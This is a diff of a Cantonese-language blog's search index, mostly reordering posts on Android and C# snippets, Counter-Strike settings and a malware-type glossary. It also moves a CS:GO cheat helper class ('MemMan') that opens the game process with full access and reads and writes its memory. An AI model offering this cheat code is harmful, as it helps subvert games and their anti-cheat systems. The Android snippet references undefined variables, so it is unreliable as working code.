class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">btn_con</span><span class="params">(View v)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        EditText textbox_nameinput = (EditText) findViewById(R.id.textbox_nameinput);</span><br><span class="line">        String ourEditTextString = editText.getText().toString();</span><br><span class="line">        String ourEditTextNoSpaces = ourEditTextString.replaceAll(<span class="string">&quot; &quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="keyword">boolean</span> isOurEditTextEmpty = ourEditTextNoSpaces.isEmpty();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (textbox1.isOurEditTextEmpty())</span><br><span class="line">        &#123;</span><br><span class="line">            textbox_nameinput.setError(<span class="string">&quot;你未打野入黎。&quot;</span>);</span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>
-
-<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>拎 EditText 入面既料<br>然後再用 <code>.isEmpty()</code> 呢個 function<br>當如果呢舊野入面係冇打既野時候，<br>條件就會成立，<br>然後就判斷為冇打到野。</p>
-<p>而 else 就係相反，<br>你有打到野。</p>
-<p>基本上所有字都計，<br>除左你撳 <code>空白鍵</code> 唔計。</p>
-<p>分別大同小異。</p>
-<p>參考資料<br><a href="https://stackoverflow.com/questions/20349522/android-check-if-edittext-is-empty-when-inputtype-is-set-on-number-phone/55621072">https://stackoverflow.com/questions/20349522/android-check-if-edittext-is-empty-when-inputtype-is-set-on-number-phone/55621072</a></p>
-]]></content>
-      <categories>
-        <category>Android Studio</category>
-      </categories>
-      <tags>
-        <tag>Java</tag>
-        <tag>Apps</tag>
       </tags>
   </entry>
   <entry>
@@ -749,6 +749,18 @@
       </tags>
   </entry>
   <entry>
+    <title>Visual Studio .Net C# Windows Form - Find Process by name</title>
+    <url>/2022/01/31/CSharp-Find-Process-by-name/</url>
+    <content><![CDATA[<figure class="highlight cs"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 程式行緊</span></span><br><span class="line"><span class="keyword">if</span> (Process.GetProcessesByName(<span class="string">&quot;Process Stop&quot;</span>).Length &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// do somethings</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 程式冇行緊</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (Process.GetProcessesByName(<span class="string">&quot;Process Start&quot;</span>).Length == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// do somethings</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Programming</category>
+      </categories>
+      <tags>
+        <tag>CSharp</tag>
+        <tag>Process</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Chrome - 即時修改網頁文字 (表面)</title>
     <url>/2022/05/31/Chrome-javascript-edittext-content/</url>
     <content><![CDATA[<img src="cover.png" width="200px"/>
@@ -760,18 +772,6 @@
       </categories>
       <tags>
         <tag>Javascript</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Visual Studio .Net C# Windows Form - Find Process by name</title>
-    <url>/2022/01/31/CSharp-Find-Process-by-name/</url>
-    <content><![CDATA[<figure class="highlight cs"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 程式行緊</span></span><br><span class="line"><span class="keyword">if</span> (Process.GetProcessesByName(<span class="string">&quot;Process Stop&quot;</span>).Length &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// do somethings</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 程式冇行緊</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (Process.GetProcessesByName(<span class="string">&quot;Process Start&quot;</span>).Length == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// do somethings</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Programming</category>
-      </categories>
-      <tags>
-        <tag>CSharp</tag>
-        <tag>Process</tag>
       </tags>
   </entry>
   <entry>
@@ -789,27 +789,6 @@
       </categories>
       <tags>
         <tag>指令</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>電腦知識 - 病毒種類 (Malware)</title>
-    <url>/2022/01/22/Computer-Malware-Type/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>「Malware」(惡意程式) 是 malicious software (惡意軟體) 的縮寫，<br>這個字指的是病毒、間諜軟體、蠕蟲，病毒、蠕蟲或特洛伊木馬程式。</p>
-<h2 id="UDS-DangerousObject-Multi-Generic"><a href="#UDS-DangerousObject-Multi-Generic" class="headerlink" title="UDS:DangerousObject.Multi.Generic"></a>UDS:DangerousObject.Multi.Generic</h2><p>可能會在受感染的計算機上執行許多惡意活動。</p>
-<h2 id="Trojan-Malware-300983-susgen"><a href="#Trojan-Malware-300983-susgen" class="headerlink" title="Trojan.Malware.300983.susgen"></a>Trojan.Malware.300983.susgen</h2><p>是一個有害的隱匿惡意軟件程序，可以偽裝成合法的OS process 並執行其有害任務，而不會被防毒軟體發現，<br>它們通常用於間諜軟體和勒索軟體。</p>
-<h2 id="Trojans"><a href="#Trojans" class="headerlink" title="Trojans"></a>Trojans</h2><p>木馬（或特洛伊木馬）將自己偽裝成合法軟件，目的是誘騙您在計算機上執行惡意軟件。</p>
-<h2 id="Spyware"><a href="#Spyware" class="headerlink" title="Spyware"></a>Spyware</h2><p>間諜軟件會侵入您的計算機並試圖竊取您的個人信息，例如信用卡或銀行信息、網絡瀏覽數據以及各種帳戶的密碼。</p>
-<h2 id="Adware"><a href="#Adware" class="headerlink" title="Adware"></a>Adware</h2><p>廣告軟件是在您的屏幕上顯示廣告的垃圾軟件。廣告軟件會收集您的個人信息，以便為您提供更加個性化的廣告。</p>
-<h2 id="Rootkits"><a href="#Rootkits" class="headerlink" title="Rootkits"></a>Rootkits</h2><p>Rootkit 使未經授權的用戶能夠在不被發現的情況下訪問您的計算機。</p>
-<h2 id="Ransomware"><a href="#Ransomware" class="headerlink" title="Ransomware"></a>Ransomware</h2><p>勒索軟件旨在加密您的文件並阻止對它們的訪問，直到支付贖金。</p>
-<h2 id="Worms"><a href="#Worms" class="headerlink" title="Worms"></a>Worms</h2><p>蠕蟲通過感染同一網絡上的其他計算機進行自我複制。它們旨在消耗帶寬和中斷網絡。</p>
-<h2 id="Keyloggers"><a href="#Keyloggers" class="headerlink" title="Keyloggers"></a>Keyloggers</h2><p>鍵盤記錄器會跟踪您在鍵盤上的擊鍵並將它們記錄在日誌中。此信息用於未經授權訪問您的帳戶。 </p>
-]]></content>
-      <categories>
-        <category>知識</category>
-      </categories>
-      <tags>
-        <tag>Malware</tag>
       </tags>
   </entry>
   <entry>
@@ -849,25 +828,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Counter-Strike 1.6 - 更改為 CS 模型</title>
-    <url>/2022/06/01/Counter-Strike-1-6-Change-CS-Default-Model/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>原本 CS1.6 既 Model 係用緊 CZ (見圖下)，<br>呢種既 Model 係大家認識既 CSO Model，<br>但其實佢係由 CZ 出黎既 Model (Counter-Strike: Condition Zero)，<br>呢隻 Model 我並唔鍾意用，<br>所以今日會講點樣改返做 CS1.6 既 Model。</p>
-<img src="/2022/06/01/Counter-Strike-1-6-Change-CS-Default-Model/CE.png" class="">
-
-<h1 id="開始"><a href="#開始" class="headerlink" title="開始"></a>開始</h1><p>我地需要開啟 CS1.6 既 Optinos，<br>然後再將撳 <code>Video</code>，<br>再將原本 Tick 左既 <code>Enable HD Models if available</code>，<br>Disable 左佢。</p>
-<p>重開後就會見到唔見左 CE Model。</p>
-<img src="/2022/06/01/Counter-Strike-1-6-Change-CS-Default-Model/done.gif" class="">
-
-<h1 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h1><p>搞掂。</p>
-<img src="/2022/06/01/Counter-Strike-1-6-Change-CS-Default-Model/done.png" class="">]]></content>
-      <categories>
-        <category>Counter-Strike 1.6</category>
-      </categories>
-      <tags>
-        <tag>Games</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Counter Strike 1.6 - AMX X Mod 升級至 1.9.0</title>
     <url>/2022/06/07/Counter-Strike-1-6-AMXX-Upgrade-to-1-9-0/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>因為 Counter-Strike 1.6 人數大不如以前，<br>測試人數也越來越小，<br>最隱定的版本是 1.8.2，<br>AMXX也很多年沒有更新了，<br>然而 1.9.0 是一個開發者版本。</p>
@@ -894,6 +854,46 @@
         <tag>Games</tag>
         <tag>Server</tag>
         <tag>AMX Mod X</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>電腦知識 - 病毒種類 (Malware)</title>
+    <url>/2022/01/22/Computer-Malware-Type/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>「Malware」(惡意程式) 是 malicious software (惡意軟體) 的縮寫，<br>這個字指的是病毒、間諜軟體、蠕蟲，病毒、蠕蟲或特洛伊木馬程式。</p>
+<h2 id="UDS-DangerousObject-Multi-Generic"><a href="#UDS-DangerousObject-Multi-Generic" class="headerlink" title="UDS:DangerousObject.Multi.Generic"></a>UDS:DangerousObject.Multi.Generic</h2><p>可能會在受感染的計算機上執行許多惡意活動。</p>
+<h2 id="Trojan-Malware-300983-susgen"><a href="#Trojan-Malware-300983-susgen" class="headerlink" title="Trojan.Malware.300983.susgen"></a>Trojan.Malware.300983.susgen</h2><p>是一個有害的隱匿惡意軟件程序，可以偽裝成合法的OS process 並執行其有害任務，而不會被防毒軟體發現，<br>它們通常用於間諜軟體和勒索軟體。</p>
+<h2 id="Trojans"><a href="#Trojans" class="headerlink" title="Trojans"></a>Trojans</h2><p>木馬（或特洛伊木馬）將自己偽裝成合法軟件，目的是誘騙您在計算機上執行惡意軟件。</p>
+<h2 id="Spyware"><a href="#Spyware" class="headerlink" title="Spyware"></a>Spyware</h2><p>間諜軟件會侵入您的計算機並試圖竊取您的個人信息，例如信用卡或銀行信息、網絡瀏覽數據以及各種帳戶的密碼。</p>
+<h2 id="Adware"><a href="#Adware" class="headerlink" title="Adware"></a>Adware</h2><p>廣告軟件是在您的屏幕上顯示廣告的垃圾軟件。廣告軟件會收集您的個人信息，以便為您提供更加個性化的廣告。</p>
+<h2 id="Rootkits"><a href="#Rootkits" class="headerlink" title="Rootkits"></a>Rootkits</h2><p>Rootkit 使未經授權的用戶能夠在不被發現的情況下訪問您的計算機。</p>
+<h2 id="Ransomware"><a href="#Ransomware" class="headerlink" title="Ransomware"></a>Ransomware</h2><p>勒索軟件旨在加密您的文件並阻止對它們的訪問，直到支付贖金。</p>
+<h2 id="Worms"><a href="#Worms" class="headerlink" title="Worms"></a>Worms</h2><p>蠕蟲通過感染同一網絡上的其他計算機進行自我複制。它們旨在消耗帶寬和中斷網絡。</p>
+<h2 id="Keyloggers"><a href="#Keyloggers" class="headerlink" title="Keyloggers"></a>Keyloggers</h2><p>鍵盤記錄器會跟踪您在鍵盤上的擊鍵並將它們記錄在日誌中。此信息用於未經授權訪問您的帳戶。 </p>
+]]></content>
+      <categories>
+        <category>知識</category>
+      </categories>
+      <tags>
+        <tag>Malware</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Counter-Strike 1.6 - 更改為 CS 模型</title>
+    <url>/2022/06/01/Counter-Strike-1-6-Change-CS-Default-Model/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>原本 CS1.6 既 Model 係用緊 CZ (見圖下)，<br>呢種既 Model 係大家認識既 CSO Model，<br>但其實佢係由 CZ 出黎既 Model (Counter-Strike: Condition Zero)，<br>呢隻 Model 我並唔鍾意用，<br>所以今日會講點樣改返做 CS1.6 既 Model。</p>
+<img src="/2022/06/01/Counter-Strike-1-6-Change-CS-Default-Model/CE.png" class="">
+
+<h1 id="開始"><a href="#開始" class="headerlink" title="開始"></a>開始</h1><p>我地需要開啟 CS1.6 既 Optinos，<br>然後再將撳 <code>Video</code>，<br>再將原本 Tick 左既 <code>Enable HD Models if available</code>，<br>Disable 左佢。</p>
+<p>重開後就會見到唔見左 CE Model。</p>
+<img src="/2022/06/01/Counter-Strike-1-6-Change-CS-Default-Model/done.gif" class="">
+
+<h1 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h1><p>搞掂。</p>
+<img src="/2022/06/01/Counter-Strike-1-6-Change-CS-Default-Model/done.png" class="">]]></content>
+      <categories>
+        <category>Counter-Strike 1.6</category>
+      </categories>
+      <tags>
+        <tag>Games</tag>
       </tags>
   </entry>
   <entry>
@@ -1509,31 +1509,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Counter-Strike 開啟 FPS 99</title>
-    <url>/2022/06/01/Counter-Strike-enabled-99FPS/</url>
-    <content><![CDATA[<img src="/2022/06/01/Counter-Strike-enabled-99FPS/cover.png" class="">
-
-<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>對於要跳 KZ 的人來說，<br>99 FPS 是必要的。</p>
-<p>加上如果只有 60 FPS，<br>玩起來也會不順暢，<br>所以今篇今是要講如何將 FPS 強制轉到 99 FPS。</p>
-<h2 id="開始"><a href="#開始" class="headerlink" title="開始"></a>開始</h2><p>我們先開啟遊戲指令台輸入</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cl_showfps 1</span><br></pre></td></tr></table></figure>
-
-<img src="/2022/06/01/Counter-Strike-enabled-99FPS/60fps.png" class="">
-
-<p>從右上角中可以看到只有 60FPS，<br>接下來我們開始進行修改。</p>
-<h2 id="NVDIA"><a href="#NVDIA" class="headerlink" title="NVDIA"></a>NVDIA</h2><p>我們需要 NVDIA 控制面板去進行修改，<br>先到你的桌面按下右鍵，再按 NVDIA 控制面板，<br>將遊戲的程式設定內的 <code>垂直同步</code> 關閉再套用。</p>
-<img src="/2022/06/01/Counter-Strike-enabled-99FPS/how.gif" class="">
-
-<h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2><p>重新開啟遊戲就會出現 99FPS。</p>
-<img src="/2022/06/01/Counter-Strike-enabled-99FPS/99fps.png" class="">]]></content>
-      <categories>
-        <category>Counter-Strike 1.6</category>
-      </categories>
-      <tags>
-        <tag>Games</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>CSO 回憶至今 第一章 | 2009年-2010年</title>
     <url>/2022/01/27/Counter-Strike-Online-Person-feels/</url>
     <content><![CDATA[<img src="/2022/01/27/Counter-Strike-Online-Person-feels/bg.png" class="">
@@ -1581,6 +1556,31 @@
       <tags>
         <tag>Games</tag>
         <tag>Counter Strike Online</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Counter-Strike 開啟 FPS 99</title>
+    <url>/2022/06/01/Counter-Strike-enabled-99FPS/</url>
+    <content><![CDATA[<img src="/2022/06/01/Counter-Strike-enabled-99FPS/cover.png" class="">
+
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>對於要跳 KZ 的人來說，<br>99 FPS 是必要的。</p>
+<p>加上如果只有 60 FPS，<br>玩起來也會不順暢，<br>所以今篇今是要講如何將 FPS 強制轉到 99 FPS。</p>
+<h2 id="開始"><a href="#開始" class="headerlink" title="開始"></a>開始</h2><p>我們先開啟遊戲指令台輸入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cl_showfps 1</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/06/01/Counter-Strike-enabled-99FPS/60fps.png" class="">
+
+<p>從右上角中可以看到只有 60FPS，<br>接下來我們開始進行修改。</p>
+<h2 id="NVDIA"><a href="#NVDIA" class="headerlink" title="NVDIA"></a>NVDIA</h2><p>我們需要 NVDIA 控制面板去進行修改，<br>先到你的桌面按下右鍵，再按 NVDIA 控制面板，<br>將遊戲的程式設定內的 <code>垂直同步</code> 關閉再套用。</p>
+<img src="/2022/06/01/Counter-Strike-enabled-99FPS/how.gif" class="">
+
+<h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2><p>重新開啟遊戲就會出現 99FPS。</p>
+<img src="/2022/06/01/Counter-Strike-enabled-99FPS/99fps.png" class="">]]></content>
+      <categories>
+        <category>Counter-Strike 1.6</category>
+      </categories>
+      <tags>
+        <tag>Games</tag>
       </tags>
   </entry>
   <entry>
@@ -1715,22 +1715,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Counter-Strike: Global Offensive - C++ 外掛 - MemMan (Windows)</title>
-    <url>/2022/01/29/Csgo-c-cheating-MemMan/</url>
-    <content><![CDATA[<h1 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h1><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MemMan</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">MemMan</span>();</span><br><span class="line">	~<span class="built_in">MemMan</span>();</span><br><span class="line">	<span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">val</span>&gt;</span></span><br><span class="line">	<span class="function">val <span class="title">readMem</span><span class="params">(<span class="keyword">uintptr_t</span> addr)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		val x;</span><br><span class="line">		<span class="built_in">ReadProcessMemory</span>(handle, (LPBYTE*)addr, &amp;x, <span class="built_in"><span class="keyword">sizeof</span></span>(x), <span class="literal">NULL</span>);</span><br><span class="line">		<span class="keyword">return</span> x;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">val</span>&gt;</span></span><br><span class="line">	<span class="function">val <span class="title">writeMem</span><span class="params">(<span class="keyword">uintptr_t</span> addr, val x)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="built_in">WriteProcessMemory</span>(handle, (LPBYTE*)addr, &amp;x, <span class="built_in"><span class="keyword">sizeof</span></span>(x), <span class="literal">NULL</span>);</span><br><span class="line">		<span class="keyword">return</span> x;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">uintptr_t</span> <span class="title">getProcess</span><span class="params">(<span class="keyword">const</span> <span class="keyword">wchar_t</span>*)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">uintptr_t</span> <span class="title">getModule</span><span class="params">(<span class="keyword">uintptr_t</span>, <span class="keyword">const</span> <span class="keyword">wchar_t</span>*)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">uintptr_t</span> <span class="title">getAddress</span><span class="params">(<span class="keyword">uintptr_t</span>, std::vector&lt;<span class="keyword">uintptr_t</span>&gt;)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	HANDLE handle;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-
-<h1 id="C"><a href="#C" class="headerlink" title="C++"></a>C++</h1><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;MemMan.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"></span><br><span class="line">MemMan::<span class="built_in">MemMan</span>()</span><br><span class="line">&#123;</span><br><span class="line">	handle = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">MemMan::~<span class="built_in">MemMan</span>()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">CloseHandle</span>(handle);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uintptr_t</span> <span class="title">MemMan::getProcess</span><span class="params">(<span class="keyword">const</span> <span class="keyword">wchar_t</span>* proc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE hProcessId = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">uintptr_t</span> process;</span><br><span class="line">	PROCESSENTRY32 pEntry;</span><br><span class="line">	pEntry.dwSize = <span class="built_in"><span class="keyword">sizeof</span></span>(pEntry);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (!_wcsicmp(pEntry.szExeFile, proc))</span><br><span class="line">		&#123;</span><br><span class="line">			process = pEntry.th32ProcessID;</span><br><span class="line">			<span class="built_in">CloseHandle</span>(hProcessId);</span><br><span class="line">			handle = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, <span class="literal">false</span>, process);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125; <span class="keyword">while</span> (<span class="built_in">Process32Next</span>(hProcessId, &amp;pEntry));</span><br><span class="line">	<span class="keyword">return</span> process;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uintptr_t</span> <span class="title">MemMan::getModule</span><span class="params">(<span class="keyword">uintptr_t</span> procId, <span class="keyword">const</span> <span class="keyword">wchar_t</span>* modName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE hModule = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, procId);</span><br><span class="line">	MODULEENTRY32 mEntry;</span><br><span class="line">	mEntry.dwSize = <span class="built_in"><span class="keyword">sizeof</span></span>(mEntry);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (!_wcsicmp(mEntry.szModule, modName))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">CloseHandle</span>(hModule);</span><br><span class="line">			<span class="keyword">return</span> (<span class="keyword">uintptr_t</span>)mEntry.hModule;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">while</span> (<span class="built_in">Module32Next</span>(hModule, &amp;mEntry));</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uintptr_t</span> <span class="title">MemMan::getAddress</span><span class="params">(<span class="keyword">uintptr_t</span> addr, std::vector&lt;<span class="keyword">uintptr_t</span>&gt; vect)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; vect.<span class="built_in">size</span>(); i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">ReadProcessMemory</span>(handle, (BYTE*)addr, &amp;addr, <span class="built_in"><span class="keyword">sizeof</span></span>(addr), <span class="number">0</span>);</span><br><span class="line">		addr += vect[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Counter-Strike Global Offensive</category>
-        <category>Programming</category>
-      </categories>
-      <tags>
-        <tag>Games</tag>
-        <tag>Game Hacking</tag>
-        <tag>CPP</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Counter-Strike: Global Offensive - 主控台指令</title>
     <url>/2022/01/07/Csgo-useful-command/</url>
     <content><![CDATA[<img src="/2022/01/07/Csgo-useful-command/csgo.png" class="">
@@ -1774,6 +1758,22 @@
         <tag>指令</tag>
         <tag>Games</tag>
         <tag>Server</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Counter-Strike: Global Offensive - C++ 外掛 - MemMan (Windows)</title>
+    <url>/2022/01/29/Csgo-c-cheating-MemMan/</url>
+    <content><![CDATA[<h1 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h1><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MemMan</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">MemMan</span>();</span><br><span class="line">	~<span class="built_in">MemMan</span>();</span><br><span class="line">	<span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">val</span>&gt;</span></span><br><span class="line">	<span class="function">val <span class="title">readMem</span><span class="params">(<span class="keyword">uintptr_t</span> addr)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		val x;</span><br><span class="line">		<span class="built_in">ReadProcessMemory</span>(handle, (LPBYTE*)addr, &amp;x, <span class="built_in"><span class="keyword">sizeof</span></span>(x), <span class="literal">NULL</span>);</span><br><span class="line">		<span class="keyword">return</span> x;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">val</span>&gt;</span></span><br><span class="line">	<span class="function">val <span class="title">writeMem</span><span class="params">(<span class="keyword">uintptr_t</span> addr, val x)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="built_in">WriteProcessMemory</span>(handle, (LPBYTE*)addr, &amp;x, <span class="built_in"><span class="keyword">sizeof</span></span>(x), <span class="literal">NULL</span>);</span><br><span class="line">		<span class="keyword">return</span> x;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">uintptr_t</span> <span class="title">getProcess</span><span class="params">(<span class="keyword">const</span> <span class="keyword">wchar_t</span>*)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">uintptr_t</span> <span class="title">getModule</span><span class="params">(<span class="keyword">uintptr_t</span>, <span class="keyword">const</span> <span class="keyword">wchar_t</span>*)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">uintptr_t</span> <span class="title">getAddress</span><span class="params">(<span class="keyword">uintptr_t</span>, std::vector&lt;<span class="keyword">uintptr_t</span>&gt;)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	HANDLE handle;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<h1 id="C"><a href="#C" class="headerlink" title="C++"></a>C++</h1><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;MemMan.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"></span><br><span class="line">MemMan::<span class="built_in">MemMan</span>()</span><br><span class="line">&#123;</span><br><span class="line">	handle = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">MemMan::~<span class="built_in">MemMan</span>()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">CloseHandle</span>(handle);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uintptr_t</span> <span class="title">MemMan::getProcess</span><span class="params">(<span class="keyword">const</span> <span class="keyword">wchar_t</span>* proc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE hProcessId = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">uintptr_t</span> process;</span><br><span class="line">	PROCESSENTRY32 pEntry;</span><br><span class="line">	pEntry.dwSize = <span class="built_in"><span class="keyword">sizeof</span></span>(pEntry);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (!_wcsicmp(pEntry.szExeFile, proc))</span><br><span class="line">		&#123;</span><br><span class="line">			process = 